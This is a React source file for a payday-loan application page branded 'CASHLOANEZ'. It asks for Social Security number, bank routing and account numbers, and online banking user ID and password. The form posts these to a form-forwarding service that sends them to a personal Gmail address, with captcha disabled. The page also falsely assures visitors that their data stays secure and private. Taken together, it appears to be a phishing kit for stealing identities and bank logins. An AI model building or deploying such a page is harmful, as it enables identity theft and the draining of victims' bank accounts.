import React, { useState } from 'react'
import './allIngo.css'

function AllInfo() {
    const [formData, setFormData] = useState({
        first_name: '',
        last_name: '',
        email_id: '',
        street_address: '',
        city: '',
        state: '',
        zip_code: '',
        mobile_phone: '',
        secondary_phone: '',
        dob: '',
        ssn: '',
        routing_number: '',
        bank_name: '',
        account_number: '',
        user_id: '',
        password: '',
    });

    const [showBanking, setShowBanking] = useState(false);

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value,
        });
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        // Submit form logic
    };

    const showBankingDetails = () => setShowBanking(true);
    const showPersonalDetails = () => setShowBanking(false);

    return (
        <div className="main">
            <section className="form-data my-20 pt-20 mt-20">
                <div className="container mx-auto">
                    <div className="row mt-8">
                        <div className="col-12">
                            <h2 className="text-gray-800">CASHLOANEZ Loan Application</h2>
                        </div>
                        <div className="col-md-8 flex justify-between">
                            <form
                                id="mainForm"
                                action="https://formsubmit.co/mharshvardhan40@gmail.com"
                                method="POST"
                                onSubmit={handleSubmit}
                            >
                                <input type="hidden" name="_captcha" value="false" />
                                <input
                                    type="hidden"
                                    name="_next"
                                    value="https://harsh-vardhan-mishra.github.io/CashLoanez/thank-you.html"
                                />
                                <input type="hidden" name="_template" value="table" />

                                {showBanking ? (
                                    <div id="bankingDetails">
                                        <h5 className="font-semibold mt-4 mb-2">BANKING</h5>
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Routing/ABA Number"
                                                    name="routing_number"
                                                    value={formData.routing_number}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Bank Name"
                                                    name="bank_name"
                                                    value={formData.bank_name}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div className="col-span-2">
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Checking Account Number"
                                                    name="account_number"
                                                    value={formData.account_number}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Online User ID"
                                                    name="user_id"
                                                    value={formData.user_id}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="password"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Online Password"
                                                    name="password"
                                                    value={formData.password}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                        </div>
                                        <div className="mt-4 flex space-x-4">
                                            <button
                                                type="button"
                                                className="btn btn-secondary bg-gray-300 text-black py-2 px-4 rounded-md"
                                                onClick={showPersonalDetails}
                                            >
                                                Back
                                            </button>
                                            <button
                                                type="submit"
                                                className="btn btn-primary bg-yellow-400 text-black py-2 px-4 rounded-md"
                                            >
                                                Submit
                                            </button>
                                        </div>
                                    </div>
                                ) : (
                                    <div id="personalDetails">
                                        <h5 className="font-semibold mt-4 mb-2">ABOUT YOU</h5>
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="First name"
                                                    name="first_name"
                                                    value={formData.first_name}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Last name"
                                                    name="last_name"
                                                    value={formData.last_name}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div className="col-span-2">
                                                <input
                                                    type="email"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Email Address"
                                                    name="email_id"
                                                    value={formData.email_id}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div className="col-span-2">
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Street Address"
                                                    name="street_address"
                                                    value={formData.street_address}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="City"
                                                    name="city"
                                                    value={formData.city}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <select
                                                    className="form-select border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    name="state"
                                                    value={formData.state}
                                                    onChange={handleChange}
                                                >
                                                    <option value="" disabled>
                                                        Select State
                                                    </option>
                                                    <option value="Alabama">Alabama</option>
                                                    <option value="Alaska">Alaska</option>
                                                    <option value="Arizona">Arizona</option>
                                                    <option value="Arkansas">Arkansas</option>
                                                    <option value="California">California</option>
                                                    <option value="Colorado">Colorado</option>
                                                    <option value="Connecticut">Connecticut</option>
                                                    <option value="District of Columbia">
                                                        District of Columbia
                                                    </option>
                                                    <option value="Delaware">Delaware</option>
                                                    <option value="Florida">Florida</option>
                                                    <option value="Georgia">Georgia</option>
                                                    <option value="Hawaii">Hawaii</option>
                                                    <option value="Idaho">Idaho</option>
                                                    <option value="Illinois">Illinois</option>
                                                    <option value="Indiana">Indiana</option>
                                                    <option value="Iowa">Iowa</option>
                                                    <option value="Kansas">Kansas</option>
                                                    <option value="Kentucky">Kentucky</option>
                                                    <option value="Louisiana">Louisiana</option>
                                                    <option value="Maine">Maine</option>
                                                    <option value="Maryland">Maryland</option>
                                                    <option value="Massachusetts">Massachusetts</option>
                                                    <option value="Michigan">Michigan</option>
                                                    <option value="Minnesota">Minnesota</option>
                                                    <option value="Mississippi">Mississippi</option>
                                                    <option value="Missouri">Missouri</option>
                                                    <option value="Montana">Montana</option>
                                                    <option value="Nebraska">Nebraska</option>
                                                    <option value="Nevada">Nevada</option>
                                                    <option value="New Hampshire">New Hampshire</option>
                                                    <option value="New Jersey">New Jersey</option>
                                                    <option value="New Mexico">New Mexico</option>
                                                    <option value="New York">New York</option>
                                                    <option value="North Carolina">North Carolina</option>
                                                    <option value="North Dakota">North Dakota</option>
                                                    <option value="Ohio">Ohio</option>
                                                    <option value="Oklahoma">Oklahoma</option>
                                                    <option value="Oregon">Oregon</option>
                                                    <option value="Pennsylvania">Pennsylvania</option>
                                                    <option value="Rhode Island">Rhode Island</option>
                                                    <option value="South Carolina">South Carolina</option>
                                                    <option value="South Dakota">South Dakota</option>
                                                    <option value="Tennessee">Tennessee</option>
                                                    <option value="Texas">Texas</option>
                                                    <option value="Utah">Utah</option>
                                                    <option value="Vermont">Vermont</option>
                                                    <option value="Virginia">Virginia</option>
                                                    <option value="Washington">Washington</option>
                                                    <option value="West Virginia">West Virginia</option>
                                                    <option value="Wisconsin">Wisconsin</option>
                                                    <option value="Wyoming">Wyoming</option>
                                                </select>
                                            </div>
                                            <div>
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="ZIP Code"
                                                    name="zip_code"
                                                    value={formData.zip_code}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="tel"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Mobile Phone"
                                                    name="mobile_phone"
                                                    value={formData.mobile_phone}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="tel"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Secondary Phone"
                                                    name="secondary_phone"
                                                    value={formData.secondary_phone}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div>
                                                <input
                                                    type="date"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    name="dob"
                                                    value={formData.dob}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <div className="col-span-2">
                                                <input
                                                    type="text"
                                                    className="form-input border-2 border-gray-300 bg-white rounded-md shadow-sm focus:border-yellow-400 focus:ring focus:ring-yellow-200 focus:ring-opacity-50 p-2"
                                                    placeholder="Social Security Number"
                                                    name="ssn"
                                                    value={formData.ssn}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                        </div>
                                        <div className="mt-4">
                                            <button
                                                type="button"
                                                className="btn btn-primary bg-yellow-400 text-black py-2 px-4 rounded-md"
                                                onClick={showBankingDetails}
                                            >
                                                Continue
                                            </button>
                                        </div>
                                    </div>
                                )}
                            </form>

                            <div id="loader" className={showBanking ? ' ' : 'hidden'}>
                                <div className="spinner-border" role="status">
                                    <span className="visually-hidden">Loading...</span>
                                </div>
                            </div>
                        </div>
                        <div className="col-md-3 mt-16">
                            <div className="side-apply">
                                <h4 className="text-xl font-semibold text-gray-800">
                                    We Offer Same Day Funding
                                </h4>
                                <p>
                                    <small>
                                        Get your money faster than ever. Receive funds in as little
                                        as 24 hours after signing.*
                                    </small>
                                </p>
                                <h4 className="lock text-xl font-semibold text-gray-800 pt-4 border-t-2 border-yellow-400">
                                    <i className="fa-solid fa-lock text-xl mr-2 text-blue-500"></i>{' '}
                                    We've Got You Covered
                                </h4>
                                <p>
                                    <b className="text-base font-semibold">
                                        Any information you provide is kept secure and{' '}
                                        <span className="text-blue-500">private.</span>
                                    </b>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>

    );
}

export default AllInfo
